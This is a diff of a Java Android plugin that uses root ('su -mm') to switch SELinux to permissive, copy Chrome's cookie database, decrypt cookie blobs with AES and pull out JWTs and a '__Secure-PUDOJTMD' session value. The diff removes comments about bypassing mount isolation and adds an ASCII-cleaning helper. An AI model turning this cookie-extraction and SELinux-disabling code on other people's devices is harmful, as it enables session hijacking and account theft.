@@ -38,7 +38,6 @@ public class KernelSuPlugin extends Plugin {
             new File("/data/local/tmp/ikw_chrome_cookies.db-wal").delete();
             new File("/data/local/tmp/ikw_chrome_cookies.db-shm").delete();
 
-            // Script executed under su -mm (Mount Master namespace) to bypass KernelSU app mount isolation
             String shellScript = 
                 "setenforce 0 2>/dev/null\n" +
                 "chmod 755 /data/data 2>/dev/null\n" +
@@ -63,7 +62,6 @@ public class KernelSuPlugin extends Plugin {
                 "setenforce 1 2>/dev/null\n" +
                 "exit\n";
 
-            // Try su -mm first (Mount Master in KernelSU / Magisk), fallback to su
             Process process;
             try {
                 process = Runtime.getRuntime().exec(new String[]{"su", "-mm"});
@@ -103,7 +101,7 @@ public class KernelSuPlugin extends Plugin {
                             String plainVal = cursor.getString(1);
                             byte[] encBytes = cursor.getBlob(2);
 
-                            String val = (plainVal != null && !plainVal.isEmpty()) ? plainVal : decryptChromeAndroidBlob(encBytes, logs);
+                            String val = (plainVal != null && !plainVal.isEmpty()) ? cleanAscii(plainVal) : decryptChromeAndroidBlob(encBytes, logs);
 
                             if (name.contains("__Secure-PUDOJTMD")) {
                                 pudojtmd = val;
@@ -172,22 +170,37 @@ public class KernelSuPlugin extends Plugin {
             byte[] decrypted = cipher.doFinal(rawPayload);
             String decryptedText = new String(decrypted, StandardCharsets.ISO_8859_1);
 
+            // 1. Extract JWT starting with eyJ
             Pattern jwtPattern = Pattern.compile("(eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+)");
             Matcher matcher = jwtPattern.matcher(decryptedText);
             if (matcher.find()) {
                 return matcher.group(1);
             }
 
-            Pattern jsonPattern = Pattern.compile("(\\{.*?\\})");
+            // 2. Extract clean JSON for PUDOJTMD
+            Pattern jsonPattern = Pattern.compile("(\\{\"maxAge\".*?\\})");
             Matcher jsonMatcher = jsonPattern.matcher(decryptedText);
             if (jsonMatcher.find()) {
                 return jsonMatcher.group(1);
             }
 
-            return decryptedText.trim();
+            // Fallback JSON matcher
+            Pattern fallbackJsonPattern = Pattern.compile("(\\{.*?\\})");
+            Matcher fallbackMatcher = fallbackJsonPattern.matcher(decryptedText);
+            if (fallbackMatcher.find()) {
+                return cleanAscii(fallbackMatcher.group(1));
+            }
+
+            return cleanAscii(decryptedText);
         } catch (Exception e) {
             logs.append("❌ Błąd deszyfrowania AES: ").append(e.getMessage()).append("\n");
             return "";
         }
+    }
+
+    private static String cleanAscii(String input) {
+        if (input == null) return "";
+        // Strip all non-ASCII or control characters (0x0d \r, 0x0a \n, binary bytes)
+        return input.replaceAll("[^\\x20-\\x7E]", "").trim();
     }
 }
